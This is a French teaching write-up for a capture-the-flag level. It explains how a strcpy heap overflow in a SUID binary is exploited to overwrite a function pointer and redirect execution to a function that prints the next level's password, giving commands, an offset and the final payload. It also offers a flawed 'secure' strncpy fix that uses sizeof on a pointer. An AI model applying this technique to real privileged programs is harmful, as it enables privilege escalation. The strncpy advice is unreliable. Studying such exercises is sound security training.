# Level6 - README Pédagogique

## 🎯 Objectif
Exploiter un **heap buffer overflow** pour écraser un **pointeur de fonction** et rediriger l'exécution vers `n()` qui affiche le flag.

**Technique** : Heap Overflow + Function Pointer Overwrite

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level6
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level7
```

### Tests comportementaux
```bash
$ ./level6
# Segmentation fault (argv[1] = NULL → strcpy crash)

$ ./level6 test
# Nope

$ python -c "print 'A'*100" | ./level6
# Segmentation fault
```

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void m(void)
{
    puts("Nope");
}

void n(void)
{
    system("/bin/cat /home/user/level7/.pass");
}

int main(int argc, char **argv)
{
    char *dest;
    void (*func_ptr)(void);

    dest     = malloc(64);       // Bloc 1 sur le heap
    func_ptr = malloc(4);        // Bloc 2 sur le heap (adjacent !)

    *((void (**)(void))func_ptr) = m;   // func_ptr pointe vers m()

    strcpy(dest, argv[1]);       // ⚠️ Pas de vérification de taille !

    (*func_ptr)();               // Appelle la fonction pointée
    return 0;
}
```

**Observations critiques** :
1. Deux `malloc()` consécutifs → blocs **adjacents** sur le heap
2. `strcpy()` sans vérification → heap overflow possible
3. `func_ptr` pointe vers `m()` → On veut le faire pointer vers `n()`

---

## 💣 Vulnérabilité : Heap Buffer Overflow

### Qu'est-ce qu'un heap overflow ?

Même principe qu'un stack overflow, mais sur le **heap**.

```c
char *dest = malloc(64);  // Buffer de 64 bytes
strcpy(dest, argv[1]);    // ⚠️ Si argv[1] > 64 bytes → débordement !
```

**Ce qui déborde** : Les données adjacentes sur le heap → ici `func_ptr`.

### strcpy() - Fonction dangereuse

```c
char *strcpy(char *dest, const char *src);
```

**Problème** : Copie TOUT `src` sans jamais vérifier la taille de `dest`.

```c
char buffer[10];
strcpy(buffer, "AAAAAAAAAAAAAAAAAAAAAA");  // 22 chars → OVERFLOW ❌
```

**Alternative sécurisée** : `strncpy(dest, src, sizeof(dest))`

---

## 🔑 Concepts clés

### 1. Layout du heap avec malloc()

Chaque bloc `malloc()` est précédé d'un **header** de 8 bytes contenant les métadonnées.

**Deux `malloc()` consécutifs** :
```
Heap :
┌──────────────────────────────────────────────────┐
│ Header dest (8 bytes)                            │
├──────────────────────────────────────────────────┤
│ dest (64 bytes)  ← malloc(64)                    │
├──────────────────────────────────────────────────┤
│ Header func_ptr (8 bytes)  ← Métadonnées malloc  │
├──────────────────────────────────────────────────┤
│ func_ptr (4 bytes)  ← malloc(4)                  │
└──────────────────────────────────────────────────┘
```

**Calcul de l'offset** :
```
De dest jusqu'à func_ptr :
  64 bytes (buffer dest)
+  8 bytes (header malloc de func_ptr)
= 72 bytes
```

### 2. Les pointeurs de fonction

**Définition** : Variable qui contient l'adresse d'une fonction.

```c
void (*func_ptr)(void);  // Déclaration d'un pointeur de fonction
func_ptr = m;            // func_ptr = adresse de m() = 0x08048420
(*func_ptr)();           // Appelle la fonction à cette adresse
```

**Pourquoi c'est exploitable ?**
```c
// func_ptr est sur le heap, adjacent à dest
// Si on overflow dest → on écrase func_ptr
// func_ptr pointe maintenant vers n() au lieu de m()
// (*func_ptr)() appelle n() → flag affiché !
```

### 3. Différence avec les niveaux précédents

| | Level1/2 | Level6 |
|---|---|---|
| **Zone mémoire** | Stack | Heap |
| **Ce qu'on écrase** | Saved return address (EIP) | Pointeur de fonction |
| **Déclenchement** | Au `ret` de la fonction | À l'appel `(*func_ptr)()` |
| **Input** | stdin (pipe) | argv (argument) |

### 4. argv vs stdin

**Niveaux précédents** (stdin) :
```bash
python -c "print payload" | ./level    # Pipe vers stdin
```

**Level6** (argv) :
```bash
./level6 $(python -c "print payload")  # Argument direct
```

**`$()` = Command substitution** :
```bash
# $(...) exécute la commande et substitue le résultat
./level6 $(python -c 'print "A"*72')
# = ./level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

---

## 🚀 Construction du payload

### Étape 1 : Trouver l'adresse de `n()`
```bash
# Dans Ghidra → cliquer sur n()
# Adresse : 0x08048454

# Ou avec objdump :
objdump -t level6 | grep " n$"
# 08048454 g     F .text  n
```

### Étape 2 : Déterminer l'offset

#### Méthode : Pattern cyclique
```bash
gdb level6
(gdb) run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"')

Program received signal SIGSEGV
(gdb) info registers eip
# eip = 0x63413663 → chercher dans le pattern → position 72
```

**Offset = 72 bytes** (64 buffer + 8 header malloc)

#### Vérification
```bash
./level6 $(python -c 'print "A"*72 + "BBBB"')
# Segfault avec adresse 0x42424242 → offset confirmé ✅
```

### Étape 3 : Conversion de l'adresse en little-endian
```
0x08048454
  08 04 84 54  (paires)
  54 84 04 08  (inversé)
→ \x54\x84\x04\x08
```

### Payload final
```
'A' × 72 + adresse de n()
'A' × 72 + '\x54\x84\x04\x08'
```

---

## 🔄 Déroulement de l'exploitation

```
État initial du heap :
┌──────────────────┬──────────┬─────────────┐
│  dest [64 bytes] │header[8b]│ func_ptr=m()│
└──────────────────┴──────────┴─────────────┘

Après strcpy(dest, payload) :
┌──────────────────┬──────────┬─────────────┐
│  AAAA...AAA [64b]│AAAA...AA │ 0x08048454  │
│  +8 bytes AAAA   │ (écrasé) │ = n() ✅    │
└──────────────────┴──────────┴─────────────┘

(*func_ptr)() :
→ func_ptr = 0x08048454 (n())
→ n() s'exécute
→ system("/bin/cat /home/user/level7/.pass")
→ Flag affiché ! 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-122** : Heap-based Buffer Overflow
- **CWE-123** : Write-what-where Condition
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **Heap Overflow + Function Pointer Overwrite**

---

## 🎓 Résumé

1. **Vulnérabilité** : `strcpy()` sans vérification de taille
2. **Zone** : Heap (deux malloc() adjacents)
3. **Cible** : Pointeur de fonction `func_ptr`
4. **Offset** : 72 bytes (64 buffer + 8 header malloc)
5. **Payload** : `'A' × 72 + adresse de n()`
6. **Résultat** : `func_ptr` pointe vers `n()` → flag affiché